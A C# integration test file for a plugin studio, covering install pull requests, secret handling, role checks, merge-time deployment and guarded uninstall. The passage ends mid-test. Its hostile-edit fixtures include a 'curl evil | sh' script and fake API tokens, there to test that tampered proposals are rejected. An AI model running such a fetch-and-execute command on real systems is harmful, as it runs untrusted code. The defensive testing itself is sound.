using System.Net.Http.Json;
using System.Security.Claims;
using System.Text.Json;
using System.Text.Json.Nodes;
using System.Text.RegularExpressions;
using FluentValidation;
using MediatR;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using Npgsql;
using Skanyxx.Core.Platform;
using Skanyxx.Core.Platform.Memory;
using Skanyxx.Core.Platform.Plugins;
using Skanyxx.Core.Platform.Studio;
using Skanyxx.Module.Agents.Studio.Definition;

namespace Skanyxx.Host.Tests;

/// <summary>
/// Plugins in the studio (P1, P3, P6–P8, P11): installing opens one pull request and nothing else; only a supervisor's
/// merge makes its servers (with header values from a fingerprinted Secret, never from git) and then its agents live;
/// a server missing a value holds itself and its agents until the owner enters one; uninstalling removes agents, then
/// servers, under the removal brake. On the real host against <see cref="FakeGitea"/> and <see cref="FakeKAgent"/>.
/// </summary>
[Collection(HostCollection.Name)]
public sealed class PluginStudioTests(PostgresFixture fixture) : IAsyncLifetime
{
    private const string Password = "a long member passphrase";
    private const string Ns = "kagent";
    private const string Repo = "skanyxx/skanyxx-agents";
    private const string Literal = "literal-api-key-0123456789";
    private const string GitHubToken = "Bearer gh-real-token-value-42";
    private static readonly string Digest = new('c', 64);

    private FakeGitea _git = null!;
    private FakeKAgent _kagent = null!;
    private HostApp _host = null!;
    private string _database = null!;
    private HttpClient _owner = null!;
    private HttpClient _supervisor = null!;
    private HttpClient _builder = null!;
    private string _builderId = null!;
    private StudioUser _ownerUser = null!;
    private StudioUser _builderUser = null!;
    private StudioUser _supervisorUser = null!;
    private StudioUser _employeeUser = null!;
    private StringWriter _console = null!;
    private TextWriter _originalOut = null!;

    public async ValueTask InitializeAsync()
    {
        _originalOut = Console.Out;
        _console = new StringWriter();
        Console.SetOut(TextWriter.Synchronized(_console));
        _git = await FakeGitea.StartAsync();
        _kagent = await FakeKAgent.StartAsync();
        _database = await fixture.NewDatabaseAsync();
        _host = await HostApp.StartAsync(_database, s =>
        {
            s["KAgent:BaseUrl"] = "127.0.0.1";
            s["KAgent:Port"] = _kagent.Port.ToString();
            s["Studio:Git:BaseUrl"] = _git.BaseUrl;
            s["Studio:Git:Token"] = FakeGitea.Token;
            s["Studio:MemoryMcpUrl"] = "http://skanyxx.skanyxx.svc:8080/mcp/memory";
            s["Studio:McpServers:0"] = "jira";
            s["Studio:ReconcileSeconds"] = "3600";
            s["Studio:LockWaitSeconds"] = "2";
        });
        _owner = await _host.OwnerAsync();
        await WaitUntilAsync(() => _kagent.AgentObjects.ContainsKey($"{Ns}/skanyxx-factory"), "the first reconcile pass after setup");
        string supervisorId, employeeId;
        (_supervisor, supervisorId) = await PersonAsync("sue@skanyxx.example", "supervisor");
        (_builder, _builderId) = await PersonAsync("bo@skanyxx.example", "builder");
        (_, employeeId) = await PersonAsync("eve@skanyxx.example", "employee");
        _ownerUser = User("owner-1", SkanyxxRoles.Owner);
        _builderUser = User(_builderId, SkanyxxRoles.Builder);
        _supervisorUser = User(supervisorId, SkanyxxRoles.Supervisor);
        _employeeUser = User(employeeId, SkanyxxRoles.Employee);
    }

    public async ValueTask DisposeAsync()
    {
        Console.SetOut(_originalOut);
        await _host.DisposeAsync();
        await _kagent.DisposeAsync();
        await _git.DisposeAsync();
    }

    // --- Install opens one pull request (P1, P3) ---

    [Fact]
    public async Task Install_OpensExactlyOnePullRequest_WithThePluginsFiles_AndNoSecretAnywhereInTheRepo()
    {
        var outcome = await InstallAsync(_builderUser, TwoServers());

        Assert.Equal(OutcomeStatus.Created, outcome.Status);
        var pull = Assert.Single(_git.Pulls);
        Assert.StartsWith($"Plugin: docs\nProposed-by: {_builderId}\n", pull.Body);
        Assert.StartsWith("plugins/docs-", pull.Head);
        Assert.Equal("Install plugin docs", pull.Title);
        var commit = Assert.Single(_git.Calls, c => c.Method == "POST" && c.Path.EndsWith("/contents"));
        Assert.Equal(
            ["agents/doc-helper/agent.yaml", "agents/doc-helper/grants.yaml", "agents/gh-helper/agent.yaml", "agents/gh-helper/grants.yaml",
                "plugins/docs/mcp/docs-search.yaml", "plugins/docs/mcp/gh-tools.yaml", "plugins/docs/plugin.yaml"],
            commit.Body!["files"]!.AsArray().Select(f => f!["path"]!.GetValue<string>()).Order(StringComparer.Ordinal));
        var head = _git.Repos[Repo][pull.Head];
        Assert.All(_git.Repos[Repo].Values.SelectMany(b => b.Values), text => Assert.DoesNotContain(Literal, text));
        Assert.DoesNotContain(Literal, commit.Body.ToJsonString());
        Assert.DoesNotContain(Literal, pull.Body);
        Assert.Contains("agent: doc-helper\ngrants: []", head["agents/doc-helper/grants.yaml"]);
        Assert.DoesNotContain("toolNames", head["agents/doc-helper/agent.yaml"]);
        Assert.Contains("template: Bearer ${GITHUB_TOKEN}", head["plugins/docs/plugin.yaml"]);
        Assert.Contains("key: x-api-key", head["plugins/docs/mcp/docs-search.yaml"]);
        Assert.Contains("gh-tools Authorization: needs a value from the owner", pull.Body);
        Assert.Contains("- agents/reviewer.md: unsupported (it runs a local stdio server)", pull.Body);
        // Nothing live before a merge.
        Assert.Empty(_kagent.CallsTo("POST", "/api/toolservers"));
        Assert.Empty(StudioAgents());

        // The literal value is in memory, protected with Data Protection, and reads back.
        var stored = await ScalarAsync("SELECT protected_values FROM memory_studio_plugin_servers WHERE server = 'docs-search'");
        Assert.False(string.IsNullOrEmpty(stored));
        Assert.DoesNotContain(Literal, stored);
        Assert.Equal(Literal, (await SendAsync(new PluginServerValuesQuery("docs-search"))).Value!.Values["X-Api-Key"]);
        Assert.DoesNotContain(Literal, _console.ToString());
    }

    [Fact]
    public async Task WhoInstalls_GitAndZipAreTheOwners_TheCatalogABuildersToo()
    {
        Assert.Equal(OutcomeStatus.Forbidden, (await InstallAsync(_builderUser, Docs("p-git", kind: "git"))).Status);
        Assert.Equal(OutcomeStatus.Forbidden, (await InstallAsync(_builderUser, Docs("p-zip", kind: "zip"))).Status);
        Assert.Equal(OutcomeStatus.Forbidden, (await InstallAsync(_employeeUser, Docs("p-cat"))).Status);
        Assert.Equal(OutcomeStatus.Forbidden, (await InstallAsync(_supervisorUser, Docs("p-cat"))).Status);
        await Assert.ThrowsAsync<ValidationException>(() => InstallAsync(_ownerUser, Docs("p-odd", kind: "ftp")));
        Assert.Empty(_git.Pulls);

        Assert.Equal(OutcomeStatus.Created, (await InstallAsync(_ownerUser, Docs("p-git", kind: "git", agent: "git-helper", server: "git-search"))).Status);
        Assert.Equal(OutcomeStatus.Created, (await InstallAsync(_ownerUser, Docs("p-zip", kind: "zip", agent: "zip-helper", server: "zip-search"))).Status);
        Assert.Equal(OutcomeStatus.Created, (await InstallAsync(_builderUser, Docs("p-cat", agent: "cat-helper", server: "cat-search"))).Status);
        Assert.Equal(3, _git.Pulls.Count);
        Assert.Equal(OutcomeStatus.Forbidden, (await SendAsync(new UninstallPluginCommand(_employeeUser, "p-cat"))).Status);
        Assert.Equal(OutcomeStatus.Forbidden, (await SendAsync(new SetPluginServerSecretsCommand(_builderUser, "cat-search", Values("X-Api-Key", "v")))).Status);
    }

    [Fact]
    public async Task NamesThatAreSomeoneElses_AreRefused()
    {
        await MergedAgentAsync("refund-helper");
        _kagent.ToolServers[$"{Ns}/foreign-search"] = new JsonObject();

        var foreignAgent = await InstallAsync(_builderUser, Docs(agent: "ticket-planner"));
        var studioAgent = await InstallAsync(_builderUser, Docs(agent: "refund-helper"));
        var foreignServer = await InstallAsync(_builderUser, Docs(server: "foreign-search"));
        var model = await InstallAsync(_builderUser, Docs() with { Agents = [Agent("doc-helper", "docs-search") with { ModelConfig = "missing-model" }] });

        Assert.Equal((OutcomeStatus.Conflict, "taken"), (foreignAgent.Status, foreignAgent.Reason));
        Assert.Equal((OutcomeStatus.Conflict, "taken"), (studioAgent.Status, studioAgent.Reason));
        Assert.Contains("no plugin owns", studioAgent.Message);
        Assert.Equal((OutcomeStatus.Conflict, "taken"), (foreignServer.Status, foreignServer.Reason));
        Assert.Equal(OutcomeStatus.Conflict, model.Status);
        Assert.Single(_git.Pulls); // only refund-helper's own proposal

        // An agent another plugin owns.
        await MergedPluginAsync(Docs(kind: "zip"));
        var other = await InstallAsync(_builderUser, Docs("other", agent: "doc-helper", server: "other-search"));
        Assert.Equal((OutcomeStatus.Conflict, "taken"), (other.Status, other.Reason));
        Assert.Contains("belongs to the plugin 'docs'", other.Message);
    }

    [Fact]
    public async Task OneOpenProposal_PerPlugin_AndPerAgent_EitherWay()
    {
        Assert.Equal(OutcomeStatus.Created, (await InstallAsync(_builderUser, Docs())).Status);

        var again = await InstallAsync(_ownerUser, Docs());
        var formForItsAgent = await _builder.PostAsJsonAsync("/api/studio/proposals", Form("doc-helper"), cancellationToken: TestContext.Current.CancellationToken);
        Assert.Equal((OutcomeStatus.Conflict, "pending"), (again.Status, again.Reason));
        Assert.Equal(HttpStatusCode.Conflict, formForItsAgent.StatusCode);
        Assert.Equal("pending", (await formForItsAgent.Content.ReadFromJsonAsync<JsonElement>(TestContext.Current.CancellationToken)).GetProperty("reason").GetString());

        // An agent with an open proposal of its own cannot be brought by a plugin either.
        Assert.Equal(HttpStatusCode.Created, (await _builder.PostAsJsonAsync("/api/studio/proposals", Form("solo"), cancellationToken: TestContext.Current.CancellationToken)).StatusCode);
        var withSolo = await InstallAsync(_builderUser, Docs("two", agent: "solo", server: "two-search"));
        Assert.Equal((OutcomeStatus.Conflict, "pending"), (withSolo.Status, withSolo.Reason));
        Assert.Equal(2, _git.Pulls.Count);
    }

    [Fact]
    public async Task APluginOfMoreThan48Files_IsRefused_AndCountsAreCapped()
    {
        var servers = Enumerable.Range(1, 10).Select(i => new PluginServerDraft($"s{i:00}", "s", "STREAMABLE_HTTP", "https://s.example.com/mcp", [])).ToList();
        var agents = Enumerable.Range(1, 20).Select(i => Agent($"a{i:00}", "s01")).ToList();

        var big = await InstallAsync(_builderUser, Docs() with { Agents = agents, Servers = servers });
        var tooMany = await Assert.ThrowsAsync<ValidationException>(() => InstallAsync(_builderUser, Docs() with { Agents = [.. agents, Agent("a21", "s01")], Servers = servers }));

        Assert.Equal((OutcomeStatus.Conflict, "too-large"), (big.Status, big.Reason));
        Assert.Contains("at most 20", tooMany.Message);
        Assert.Empty(_git.Pulls);
    }

    public static TheoryData<string, string> Untrusted => new()
    {
        { "an http server", "http" },
        { "a server named like the owner's", "jira" },
        { "a literal in a template", "template" },
        { "a template and a value", "both" },
        { "an agent with memory", "grants" },
        { "an agent using another server", "other-server" },
        { "a multi-line description", "description" },
        { "a git source without a commit", "commit" }
    };

    [Theory]
    [MemberData(nameof(Untrusted))]
    public async Task AnUntrustedPlugin_IsJudgedLikeMergedFiles(string what, string kind)
    {
        var docs = Docs();
        var bad = kind switch
        {
            "http" => docs with { Servers = [DocsServer() with { Url = "http://docs.example.com/mcp" }] },
            "jira" => docs with { Servers = [DocsServer() with { Name = "jira" }], Agents = [Agent("doc-helper", "jira")] },
            "template" => docs with { Servers = [DocsServer() with { Headers = [new PluginHeader("Authorization", "Bearer sk-live-0123456789abcdefghij", null)] }] },
            "both" => docs with { Servers = [DocsServer() with { Headers = [new PluginHeader("Authorization", "${T}", "v")] }] },
            "grants" => docs with { Agents = [Agent("doc-helper", "docs-search") with { Grants = [new StudioGrant("company", true, true)] }] },
            "other-server" => docs with { Agents = [Agent("doc-helper", "jira") with { McpTools = [new McpToolChoice("jira", ["search"])] }] },
            "description" => docs with { Description = "two\nlines" },
            _ => docs with { Source = new PluginSource("git", "https://github.com/acme/plugins", null, "plugins/docs", Digest) }
        };

        await Assert.ThrowsAsync<ValidationException>(() => InstallAsync(_ownerUser, bad));
        Assert.True(_git.Pulls.Count == 0, what);
    }

    // --- The inspector's plugin shape (P8) ---

    public static TheoryData<string, string> HostileEdits => new()
    {
        { "an extra path", "plugins/docs/run.sh is not a file this plugin proposal may add" },
        { "an agent it does not list", "agents/intruder/agent.yaml is not a file this plugin proposal may add" },
        { "grants added", "never has memory grants" },
        { "a server with an inline value", "docs-search.yaml is not a plugin server" },
        { "a credential in the instructions", "seems to hold an API token" },
        { "a listed agent with no files", "agents/ghost needs both" },
        { "another plugin's folder", "plugins/other/plugin.yaml is not a file this plugin proposal may add" },
        { "a renamed header", "must name the same headers" }
    };

    [Theory]
    [MemberData(nameof(HostileEdits))]
    public async Task AHostileEditOfAPluginProposal_IsNotMerged_AndNothingIsApplied(string edit, string reason)
    {
        await InstallAsync(_builderUser, Docs());
        var pull = _git.Pulls.Single();
        var head = _git.Repos[Repo][pull.Head];
        _git.PushToBranch(pull.Head, edit switch
        {
            "an extra path" => new() { ["plugins/docs/run.sh"] = "curl evil | sh" },
            "an agent it does not list" => AgentFiles(Agent("intruder", "docs-search")),
            "grants added" => AgentFiles(Agent("doc-helper", "docs-search") with
            {
                Grants = [new StudioGrant("company", true, true)]
            }),
            "a server with an inline value" => new()
            {
                ["plugins/docs/mcp/docs-search.yaml"] = head["plugins/docs/mcp/docs-search.yaml"].Replace("      key: x-api-key\n", "      key: x-api-key\n    value: hunter2-hunter2\n")
            },
            "a credential in the instructions" => AgentFiles(Agent("doc-helper", "docs-search") with { Instructions = "Call with ghp_0123456789abcdefghijklmnopqrstuvwxyzAB." }),
            "a listed agent with no files" => new() { ["plugins/docs/plugin.yaml"] = head["plugins/docs/plugin.yaml"].Replace("agents:\n- doc-helper\n", "agents:\n- doc-helper\n- ghost\n") },
            "another plugin's folder" => new() { ["plugins/other/plugin.yaml"] = "name: other\n" },
            _ => new() { ["plugins/docs/mcp/docs-search.yaml"] = head["plugins/docs/mcp/docs-search.yaml"].Replace("name: X-Api-Key", "name: X-Other-Key").Replace("key: x-api-key", "key: x-other-key") }
        });

        var detail = await _supervisor.GetFromJsonAsync<JsonElement>($"/api/studio/proposals/{pull.Number}", TestContext.Current.CancellationToken);
        var merge = await MergeAsync(_owner, pull.Number);

        Assert.Equal("docs", detail.GetProperty("summary").GetProperty("plugin").GetString());
        Assert.Contains(detail.GetProperty("problems").EnumerateArray(), p => p.GetString()!.Contains(reason));
        Assert.Equal(HttpStatusCode.Conflict, merge.StatusCode);
        Assert.Equal("invalid", (await merge.Content.ReadFromJsonAsync<JsonElement>(TestContext.Current.CancellationToken)).GetProperty("reason").GetString());
        Assert.True(pull.Open);
        Assert.Empty(StudioAgents());
        Assert.Empty(_kagent.ToolServers);
    }

    [Fact]
    public async Task APluginProposal_CannotRemoveAnAgentItDoesNotOwn_NorPassAsAnAgentProposal()
    {
        await MergedAgentAsync("refund-helper");
        await InstallAsync(_builderUser, Docs());
        var pull = _git.Pulls.Last();
        _git.PushToBranch(pull.Head, new() { ["agents/refund-helper/agent.yaml"] = null, ["agents/refund-helper/grants.yaml"] = null });

        var detail = await _supervisor.GetFromJsonAsync<JsonElement>($"/api/studio/proposals/{pull.Number}", TestContext.Current.CancellationToken);
        Assert.Contains(detail.GetProperty("problems").EnumerateArray(), p => p.GetString()!.Contains("agents/refund-helper/agent.yaml is not a file this plugin proposal may remove"));

        // Without the trailer, the same files are not one agent's: refused as an agent proposal.
        var number = _git.OpenPull(pull.Head, "sneaky", "Agent: doc-helper\nProposed-by: x\n");
        Assert.Equal(HttpStatusCode.Conflict, (await MergeAsync(_owner, number)).StatusCode);
        Assert.True(_kagent.AgentObjects.ContainsKey($"{Ns}/refund-helper"));
    }

    [Fact]
    public async Task APluginProposal_HasNoPreview()
    {
        await InstallAsync(_builderUser, Docs());

        var preview = await _builder.PostAsync($"/api/studio/proposals/{_git.Pulls.Single().Number}/preview", null, TestContext.Current.CancellationToken);

        Assert.Equal(HttpStatusCode.Conflict, preview.StatusCode);
        Assert.Contains("plugin proposals have no preview", await preview.Content.ReadAsStringAsync(TestContext.Current.CancellationToken));
        Assert.DoesNotContain(_kagent.AgentObjects.Keys, k => k.Contains("preview"));
    }

    // --- Merge → servers, then agents (P6, P8) ---

    [Fact]
    public async Task AMerge_CreatesServersThenAgents_WithFingerprintedSecrets_AndHoldsWhatNeedsASecret_UntilTheOwnerEntersIt()
    {
        _kagent.DiscoveredTools[$"{Ns}/docs-search"] = ["search_docs", "read_page"];
        await InstallAsync(_ownerUser, TwoServers(kind: "zip"));
        Assert.Equal(HttpStatusCode.Forbidden, (await MergeAsync(_builder, _git.Pulls.Single().Number)).StatusCode);
        // D222: a plugin from a zip is third-party content: the owner merges it, not a supervisor.
        var bySupervisor = await MergeAsync(_supervisor, _git.Pulls.Single().Number);
        Assert.Equal(HttpStatusCode.Forbidden, bySupervisor.StatusCode);
        Assert.Contains("only the owner merges it", await bySupervisor.Content.ReadAsStringAsync(TestContext.Current.CancellationToken));

        var merged = await MergeAsync(_owner, _git.Pulls.Single().Number);

        Assert.Equal(HttpStatusCode.OK, merged.StatusCode);
        var secretName = SecretOf("docs-search");
        Assert.Matches("^docs-search-[0-9a-f]{12}$", secretName);
        var server = _kagent.ToolServers[$"{Ns}/docs-search"];
        Assert.Equal(secretName, server["spec"]!["headersFrom"]![0]!["valueFrom"]!["name"]!.GetValue<string>());
        Assert.Equal("x-api-key", server["spec"]!["headersFrom"]![0]!["valueFrom"]!["key"]!.GetValue<string>());
        Assert.Equal("skanyxx-studio", server["metadata"]!["labels"]!["skanyxx.dev/managed-by"]!.GetValue<string>());
        Assert.Equal(Literal, _kagent.SecretData[$"{secretName}/x-api-key"].Value);
        var agent = _kagent.AgentObjects[$"{Ns}/doc-helper"];
        Assert.Equal("true", agent["metadata"]!["labels"]!["skanyxx.dev/merged"]!.GetValue<string>());
        var tool = agent["spec"]!["declarative"]!["tools"]![0]!["mcpServer"]!;
        Assert.Equal("docs-search", tool["name"]!.GetValue<string>());
        Assert.Null(tool["toolNames"]); // every tool the server lists
        var calls = _kagent.Calls.ToList();
        Assert.True(calls.FindIndex(c => c.Method == "POST" && c.Path == "/api/toolservers") < calls.FindIndex(c => c.Method == "POST" && c.Path == "/api/agents"
            && c.Body!["metadata"]!["name"]!.GetValue<string>() == "doc-helper"));
        // The template header has no value: its server is not created and its agent is held.
        Assert.False(_kagent.ToolServers.ContainsKey($"{Ns}/gh-tools"));
        Assert.False(_kagent.AgentObjects.ContainsKey($"{Ns}/gh-helper"));
        var overview = (await SendAsync(new PluginsOverviewQuery(_builderUser))).Value!;
        var docs = Assert.Single(overview.Plugins);
        Assert.Equal([PluginServerStates.Deployed, PluginServerStates.NeedsSecret], docs.Servers.Select(s => s.State));
        Assert.Equal(new PluginHeaderSummary("Authorization", "Bearer ${GITHUB_TOKEN}", false), docs.Servers[1].Headers.Single());
        Assert.Equal([true, false], docs.Agents.Select(a => a.Live));
        Assert.Equal("zip", docs.Source!.Kind);

        // Only the owner, only declared headers.
        Assert.Equal(OutcomeStatus.Forbidden, (await SendAsync(new SetPluginServerSecretsCommand(_builderUser, "gh-tools", Values("Authorization", GitHubToken)))).Status);
        var undeclared = await SendAsync(new SetPluginServerSecretsCommand(_ownerUser, "gh-tools", Values("X-Other", "v")));
        Assert.Equal((OutcomeStatus.Conflict, "undeclared"), (undeclared.Status, undeclared.Reason));
        var entered = await SendAsync(new SetPluginServerSecretsCommand(_ownerUser, "gh-tools", Values("authorization", GitHubToken)));
        Assert.Equal(OutcomeStatus.Ok, entered.Status);
        // D220: the fingerprint names the stored set at random, and the answer does not carry it.
        var fingerprint = (await SendAsync(new PluginServerRecordsQuery())).Value!.Single(r => r.Server == "gh-tools").ValueFingerprint!;
        Assert.DoesNotContain(fingerprint, entered.Value!.Message);
        // The entry wakes the reconcile loop; this pass runs unless the loop's already does.
        await ReconcileAsync();
        await WaitUntilAsync(() => _kagent.AgentObjects.ContainsKey($"{Ns}/gh-helper"), "the held agent after the owner's entry");

        var ghSecret = SecretOf("gh-tools");
        Assert.Equal($"gh-tools-{fingerprint}", ghSecret);
        Assert.Equal(GitHubToken, _kagent.SecretData[$"{ghSecret}/authorization"].Value);
        Assert.Equal("SSE", _kagent.ToolServers[$"{Ns}/gh-tools"]["spec"]!["protocol"]!.GetValue<string>());
        Assert.True(_kagent.AgentObjects.ContainsKey($"{Ns}/gh-helper"));
        overview = (await SendAsync(new PluginsOverviewQuery(_builderUser))).Value!;
        Assert.All(overview.Plugins.Single().Servers, s => Assert.Equal(PluginServerStates.Deployed, s.State));
        Assert.True(overview.Plugins.Single().Servers[1].Headers.Single().HasValue);
        Assert.DoesNotContain(GitHubToken, JsonSerializer.Serialize(overview));
        Assert.DoesNotContain(Literal, JsonSerializer.Serialize(overview));

        // Values never reach a log line.
        Assert.DoesNotContain("gh-real-token-value", _console.ToString());
        Assert.DoesNotContain(Literal, _console.ToString());
        Assert.Contains("Studio created the plugin server", _console.ToString());
    }

    [Fact]
    public async Task ARotation_OrASpecChange_ReplacesTheServer_AndAnUnchangedOneIsNeverWritten()
    {
        await MergedPluginAsync(Docs(kind: "zip"));
        var first = SecretOf("docs-search");
        Assert.Equal(0, await ReconcileAsync());
        var writes = WriteCount();
        Assert.Equal(0, await ReconcileAsync());
        Assert.Equal(writes, WriteCount());

        // The owner rotates the value: delete + create, under a Secret named for the new value.
        Assert.Equal(OutcomeStatus.Ok, (await SendAsync(new SetPluginServerSecretsCommand(_ownerUser, "docs-search", Values("X-Api-Key", "rotated-value-987654")))).Status);
        await ReconcileAsync();
        await WaitUntilAsync(() => _kagent.SecretData.Any(s => s.Value.Value == "rotated-value-987654"), "the rotated value in kagent");
        var second = SecretOf("docs-search");
        Assert.NotEqual(first, second);
        Assert.Equal("rotated-value-987654", _kagent.SecretData[$"{second}/x-api-key"].Value);
        Assert.False(_kagent.SecretData.ContainsKey($"{first}/x-api-key"));
        Assert.Single(_kagent.CallsTo("DELETE", "/api/toolservers/kagent/docs-search"));

        // A new version with another spec at the same address: delete + create again; the value the server has is kept, not the plugin's.
        Assert.Equal(OutcomeStatus.Created, (await InstallAsync(_ownerUser, Docs(kind: "zip") with { Servers = [DocsServer() with { Description = "Searches the docs, v2" }] })).Status);
        var update = _git.Pulls.Last();
        Assert.Equal("Update plugin docs", update.Title);
        Assert.Contains("docs-search X-Api-Key: kept", update.Body);
        Assert.Equal(["plugins/docs/mcp/docs-search.yaml"], _git.Calls.Last(c => c.Path.EndsWith("/contents")).Body!["files"]!.AsArray()
            .Select(f => f!["path"]!.GetValue<string>()));
        Assert.Equal(HttpStatusCode.OK, (await MergeAsync(_owner, update.Number)).StatusCode);
        Assert.Equal("Searches the docs, v2", _kagent.ToolServers[$"{Ns}/docs-search"]["spec"]!["description"]!.GetValue<string>());
        Assert.Equal(2, _kagent.CallsTo("DELETE", "/api/toolservers/kagent/docs-search").Count());
        Assert.Equal("rotated-value-987654", _kagent.SecretData[$"{SecretOf("docs-search")}/x-api-key"].Value);
    }

    [Fact]
    public async Task AReinstall_RemovesWhatTheNewVersionDropped()
    {
        await MergedPluginAsync(TwoServers(withGhValue: true, kind: "zip"));
        Assert.True(_kagent.AgentObjects.ContainsKey($"{Ns}/gh-helper"));
        await MergedAgentAsync("keeper");
        await MergedAgentAsync("keeper-two");

        Assert.Equal(OutcomeStatus.Created, (await InstallAsync(_ownerUser, Docs(kind: "zip"))).Status);
        var files = _git.Calls.Last(c => c.Path.EndsWith("/contents")).Body!["files"]!.AsArray();
        Assert.Equal(["agents/gh-helper/agent.yaml", "agents/gh-helper/grants.yaml", "plugins/docs/mcp/gh-tools.yaml"],
            files.Where(f => f!["operation"]!.GetValue<string>() == "delete").Select(f => f!["path"]!.GetValue<string>()).Order(StringComparer.Ordinal));
        Assert.Equal(HttpStatusCode.OK, (await MergeAsync(_owner, _git.Pulls.Last().Number)).StatusCode);

        Assert.False(_kagent.AgentObjects.ContainsKey($"{Ns}/gh-helper"));
        Assert.False(_kagent.ToolServers.ContainsKey($"{Ns}/gh-tools"));
        Assert.True(_kagent.ToolServers.ContainsKey($"{Ns}/docs-search"));
        Assert.DoesNotContain((await SendAsync(new PluginServerRecordsQuery())).Value!, r => r.Server == "gh-tools");
    }

    // --- Uninstall: agents, then servers, under the brake (P8, D119) ---

    [Fact]
    public async Task Uninstall_RemovesTheAgentsThenTheServers_AndNeverAnAllowListedServer()
    {
        _kagent.ToolServers[$"{Ns}/jira"] = new JsonObject();
        await MergedAgentAsync("keeper");
        await MergedAgentAsync("keeper-two");
        await MergedPluginAsync(Docs(kind: "zip"));

        var uninstall = await SendAsync(new UninstallPluginCommand(_builderUser, "docs"));

        Assert.Equal(OutcomeStatus.Created, uninstall.Status);
        var files = _git.Calls.Last(c => c.Path.EndsWith("/contents")).Body!["files"]!.AsArray();
        Assert.All(files, f => Assert.Equal("delete", f!["operation"]!.GetValue<string>()));
        Assert.Equal(["agents/doc-helper/agent.yaml", "agents/doc-helper/grants.yaml", "plugins/docs/mcp/docs-search.yaml", "plugins/docs/plugin.yaml"],
            files.Select(f => f!["path"]!.GetValue<string>()).Order(StringComparer.Ordinal));
        Assert.Equal("Uninstall plugin docs", _git.Pulls.Last().Title);
        Assert.True(_kagent.AgentObjects.ContainsKey($"{Ns}/doc-helper")); // nothing goes before the merge

        var removed = await MergeAsync(_supervisor, _git.Pulls.Last().Number);
        Assert.Equal(HttpStatusCode.OK, removed.StatusCode);
        // D223: the answer says what happened: a removal, not an install.
        Assert.Contains("the plugin docs is removed (its agents, then its servers)", await removed.Content.ReadAsStringAsync(TestContext.Current.CancellationToken));

        Assert.False(_kagent.AgentObjects.ContainsKey($"{Ns}/doc-helper"));
        Assert.False(_kagent.ToolServers.ContainsKey($"{Ns}/docs-search"));
        Assert.DoesNotContain(_kagent.SecretData.Keys, k => k.StartsWith("docs-search-"));
        Assert.True(_kagent.ToolServers.ContainsKey($"{Ns}/jira"));
        Assert.Empty(_kagent.CallsTo("DELETE", "/api/toolservers/kagent/jira"));
        Assert.Equal([$"{Ns}/keeper", $"{Ns}/keeper-two"], StudioAgents().Order());
        var calls = _kagent.Calls.ToList();
        Assert.True(calls.FindIndex(c => c.Method == "DELETE" && c.Path == "/api/agents/kagent/doc-helper")
            < calls.FindIndex(c => c.Method == "DELETE" && c.Path == "/api/toolservers/kagent/docs-search"));
        Assert.Empty((await SendAsync(new PluginServerRecordsQuery())).Value!);
        Assert.Equal(OutcomeStatus.NotFound, (await SendAsync(new UninstallPluginCommand(_builderUser, "docs"))).Status);
    }

    [Fact]
    public async Task Uninstall_OfMoreThanTheBrakeAllows_WaitsForTheOwner()
    {
        await MergedPluginAsync(Docs(kind: "zip") with
        {
            Agents = [Agent("doc-helper", "docs-search"), Agent("doc-writer", "docs-index")],
            Servers = [DocsServer(), DocsServer() with { Name = "docs-index", Headers = [] }]
        });
        Assert.Equal(2, StudioAgents().Count);
        await SendAsync(new UninstallPluginCommand(_builderUser, "docs"));

        var merge = await MergeAsync(_supervisor, _git.Pulls.Last().Number);

        Assert.Equal(HttpStatusCode.Accepted, merge.StatusCode);
        // D223: held by the brake, which only the owner's confirmation lifts; not "retried on the next pass".
        var answer = await merge.Content.ReadAsStringAsync(TestContext.Current.CancellationToken);
        Assert.Contains("4 removal(s) wait for the owner's confirmation", answer);
        Assert.DoesNotContain("retries", answer);
        Assert.Equal(2, StudioAgents().Count);
        Assert.True(_kagent.ToolServers.ContainsKey($"{Ns}/docs-search"));
        Assert.Contains("Studio removes no agent this pass (nor plugin server)", _console.ToString());

        Assert.Equal(HttpStatusCode.OK, (await _owner.PostAsync("/api/studio/confirm", null, TestContext.Current.CancellationToken)).StatusCode);
        Assert.Empty(StudioAgents());
        Assert.Empty(_kagent.ToolServers);
    }

    // --- Ownership and the allow-list (P6, P7) ---

    [Fact]
    public async Task AServerSkanyxxDidNotCreate_IsNeverTouched_AndItsAgentsAreHeld()
    {
        await InstallAsync(_builderUser, Docs());
        _kagent.ToolServers[$"{Ns}/docs-search"] = new JsonObject { ["owner"] = "someone" };
        // main written by hand, around the merge gate.
        foreach (var (path, content) in _git.Repos[Repo][_git.Pulls.Single().Head].Where(f => f.Key.StartsWith("plugins/") || f.Key.StartsWith("agents/")))
            _git.Main()[path] = content;

        await ReconcileAsync();

        Assert.Equal("someone", _kagent.ToolServers[$"{Ns}/docs-search"]["owner"]!.GetValue<string>());
        Assert.Empty(_kagent.CallsTo("DELETE", "/api/toolservers"));
        Assert.Empty(_kagent.CallsTo("POST", "/api/toolservers"));
        Assert.False(_kagent.AgentObjects.ContainsKey($"{Ns}/doc-helper"));
        Assert.Equal(PluginServerStates.Foreign, (await SendAsync(new PluginsOverviewQuery(_ownerUser))).Value!.Plugins.Single().Servers.Single().State);
    }

    [Fact]
    public async Task AMergedPluginServer_IsOnTheAllowList_ForEveryAgent_ByToolName_AndNeverBesideMemory()
    {
        await MergedPluginAsync(Docs(kind: "zip"));

        var number = await ProposeAsync(Form("uses-docs", tools: [new { server = "docs-search", tools = new[] { "search_docs" } }]));
        Assert.Equal(HttpStatusCode.OK, (await MergeAsync(_supervisor, number)).StatusCode);
        var unknown = await _builder.PostAsJsonAsync("/api/studio/proposals", Form("x2", tools: [new { server = "not-there", tools = Array.Empty<string>() }]),
            cancellationToken: TestContext.Current.CancellationToken);
        // D219: "every tool" (now and later) is the plugin's own agents' only; and a plugin server never sits beside memory.
        var everyTool = await _builder.PostAsJsonAsync("/api/studio/proposals", Form("x3", tools: [new { server = "docs-search", tools = Array.Empty<string>() }]),
            cancellationToken: TestContext.Current.CancellationToken);
        var withMemory = await _builder.PostAsJsonAsync("/api/studio/proposals",
            Form("x4", tools: [new { server = "docs-search", tools = new[] { "search_docs" } }], grants: [new { scope = "company", search = true, upsert = false }]),
            cancellationToken: TestContext.Current.CancellationToken);

        Assert.Equal("docs-search", _kagent.AgentObjects[$"{Ns}/uses-docs"]["spec"]!["declarative"]!["tools"]![0]!["mcpServer"]!["name"]!.GetValue<string>());
        Assert.Equal(HttpStatusCode.BadRequest, unknown.StatusCode);
        Assert.Equal(HttpStatusCode.BadRequest, everyTool.StatusCode);
